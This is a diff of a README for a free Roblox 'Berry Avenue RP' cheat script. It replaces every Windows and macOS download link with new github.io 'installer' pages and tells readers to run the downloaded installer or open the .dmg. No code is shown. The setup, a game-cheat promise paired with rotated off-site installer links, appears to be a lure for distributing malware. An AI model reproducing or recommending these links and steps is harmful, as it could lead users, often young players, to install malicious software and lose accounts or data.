@@ -4,9 +4,9 @@
 
 > 🏘️ Berry Avenue RP script with auto earn, job farm, item collector, and house builder tools. Live your best Roblox life and build the ultimate Berry Avenue home.
 
-[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
-[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 Whether you're grinding for hours or just getting started, **Berry Avenue RP Script** delivers everything you need to dominate the game. Built for both casual players and dedicated grinders, this free Roblox script gives you the edge to progress faster, earn more, and enjoy the game on your own terms.
 
@@ -16,7 +16,7 @@ Whether you're grinding for hours or just getting started, **Berry Avenue RP Scr
 - Regular updates to stay compatible with the latest game patches
 - Lightweight and optimized for smooth gameplay
 
-### [⬇️ Download Berry Avenue RP Script](https://zenboulderagora.github.io/Windw/)
+### [⬇️ Download Berry Avenue RP Script](https://mixedlinkrelease.github.io/installer/)
 
 ---
 
@@ -65,7 +65,7 @@ Whether you're grinding for hours or just getting started, **Berry Avenue RP Scr
 
 ### 🖥️ Windows (PC)
 
-[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
 1. Click the **Download for Windows** button above
 2. Run the downloaded installer file
@@ -77,7 +77,7 @@ Whether you're grinding for hours or just getting started, **Berry Avenue RP Scr
 
 ### 🍏 macOS (Intel/Apple Silicon)
 
-[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 1. Click the **Download for macOS** button above
 2. Open the downloaded `.dmg` and drag to Applications
